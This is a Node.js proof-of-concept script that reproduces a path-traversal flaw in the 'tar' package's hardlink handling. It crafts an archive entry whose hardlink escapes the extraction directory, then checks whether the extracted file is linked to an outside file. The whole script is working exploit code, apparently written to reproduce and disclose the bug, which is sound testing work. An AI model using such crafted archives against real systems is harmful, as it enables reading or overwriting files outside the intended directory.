
const tar = require('tar');
const fs = require('fs');
const path = require('path');

const extractDir = path.join(__dirname, 'extract');
const outsideFile = path.join(__dirname, 'outside.txt');
const tarFile = path.join(__dirname, 'repro_mismatch.tar');

function createTarHeader(name, linkname, type) {
    const buf = Buffer.alloc(512);
    buf.write(name, 0); // name
    buf.write('0000644', 100); // mode
    buf.write('0000000', 108); // uid
    buf.write('0000000', 116); // gid
    buf.write('00000000000', 124); // size
    buf.write('00000000000', 136); // mtime
    buf.write(type, 156); // typeflag
    buf.write(linkname, 157); // linkname
    buf.write('ustar', 257); // magic
    buf.write('00', 263); // version

    // checksum
    let cksum = 0;
    for (let i = 0; i < 512; i++) {
        cksum += (i >= 148 && i < 156) ? 32 : buf[i];
    }
    buf.write(cksum.toString(8).padStart(6, '0') + '\0 ', 148);

    return buf;
}

if (fs.existsSync(extractDir)) fs.rmSync(extractDir, { recursive: true });
fs.mkdirSync(extractDir);
if (fs.existsSync(outsideFile)) fs.unlinkSync(outsideFile);
fs.writeFileSync(outsideFile, 'secret content');

// We are in /app
// extractDir is /app/extract
// outsideFile is /app/outside.txt
// Relative path from /app/extract to /app/outside.txt is ../outside.txt
// But if we use entryDir deep in the extract dir:
// entry.path = 'a/b/c/d/x'
// entryDir = 'a/b/c/d'
// linkpath = '../../../../outside.txt'
// Resolve(entryDir, linkpath) = 'outside.txt' -> PASSES check
// Resolve(extractDir, linkpath) = '/app/outside.txt' -> ESCAPES!

const header = createTarHeader('a/b/c/d/x', '../../../../outside.txt', '1');
fs.writeFileSync(tarFile, Buffer.concat([header, Buffer.alloc(1024)]));

console.log('Unpacking with preservePaths: false (default)...');
try {
    tar.x({
        file: tarFile,
        cwd: extractDir,
        sync: true,
        preservePaths: false,
        onwarn: (code, msg) => console.log(`WARN [${code}]: ${msg}`)
    });

    const targetFile = path.join(extractDir, 'a/b/c/d/x');
    if (fs.existsSync(targetFile)) {
        const s1 = fs.statSync(targetFile);
        const s2 = fs.statSync(outsideFile);
        if (s1.ino === s2.ino) {
            console.log('VULNERABLE: a/b/c/d/x is a hardlink to outside.txt');
        } else {
            console.log('Not a hardlink to outside.txt');
        }
    } else {
        console.log('Target file was not created.');
    }
} catch (e) {
    console.log('Error during unpack:', e.message);
}
